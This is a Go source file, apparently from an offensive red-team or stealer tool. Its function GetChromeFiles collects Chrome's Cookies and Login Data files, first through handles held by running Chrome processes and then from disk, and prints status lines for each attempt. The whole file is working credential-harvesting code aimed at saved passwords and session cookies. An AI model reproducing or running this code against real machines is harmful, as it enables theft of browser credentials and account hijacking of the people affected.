package chromefile

import "fmt"

// GetChromeFiles attempts to retrieve Chrome files from either process handles or disk
func GetChromeFiles(pids []uint32) (*ChromeFiles, error) {
	results := &ChromeFiles{}
	//fmt.Println("\n[*] Attempting handle-based access first, falling back to disk, second...")

	// Try process handle method if we have PIDs
	for _, pid := range pids {
		// Try cookies if we haven't found it yet
		if !results.Cookies.FromHandle {
			//fmt.Printf("[*] Attempting to get Cookies via handle from PID %d...\n", pid)
			if data, name, err := getFileFromProcess(pid, chromePaths[Cookies]); err == nil {
				results.Cookies = FileData{
					Data:       data,
					FromHandle: true,
					Size:       int64(len(data)),
					Path:       name,
				}
				fmt.Printf("[+] %d - Successfully got Cookies via handle\n", pid)
			} else {
				fmt.Printf("[-] %d - Failed to get Cookies via handle\n", pid)
			}
		}

		// Try login data if we haven't found it yet
		if !results.LoginData.FromHandle {
			//fmt.Printf("[*] Attempting to get Login Data via handle from PID %d...\n", pid)
			if data, name, err := getFileFromProcess(pid, chromePaths[LoginData]); err == nil {
				results.LoginData = FileData{
					Data:       data,
					FromHandle: true,
					Size:       int64(len(data)),
					Path:       name,
				}
				fmt.Printf("[+] %d - Successfully got Login Data via handle %s\n", pid, results.LoginData.Source())
			} else {
				fmt.Printf("[-] %d - Failed to get Login Data via handle\n", pid)
			}
		}

		// If we found both files via handles, we can stop looking
		if results.Cookies.FromHandle && results.LoginData.FromHandle {
			break
		}
	}

	// Try direct file access for any files we couldn't get through process handles
	if !results.Cookies.FromHandle {
		//fmt.Println("[*] Attempting to get Cookies from disk...")
		if data, path, err := getFileFromDisk(chromePaths[Cookies]); err == nil {
			results.Cookies = FileData{
				Data:       data,
				FromHandle: false,
				Size:       int64(len(data)),
				Path:       path,
			}
			fmt.Printf("[+] Successfully got Cookies from disk:%s\n", path)
		} else {
			results.Cookies = FileData{
				Error: err.Error(),
			}
			fmt.Printf("[-] Failed to get Cookies from disk: %v\n", err)
		}
	}

	if !results.LoginData.FromHandle {
		//fmt.Println("[*] Attempting to get Login Data from disk...")
		if data, path, err := getFileFromDisk(chromePaths[LoginData]); err == nil {
			results.LoginData = FileData{
				Data:       data,
				FromHandle: false,
				Size:       int64(len(data)),
				Path:       path,
			}
			fmt.Printf("[+] Successfully got Login Data from disk: %s\n", path)
		} else {
			results.LoginData = FileData{
				Error: err.Error(),
			}
			fmt.Printf("[-] Failed to get Login Data from disk: %v\n", err)
		}
	}

	return results, nil
}

// Source returns a string describing where the data came from
func (f FileData) Source() string {
	if f.FromHandle {
		return "process handle"
	}
	return "disk"
}
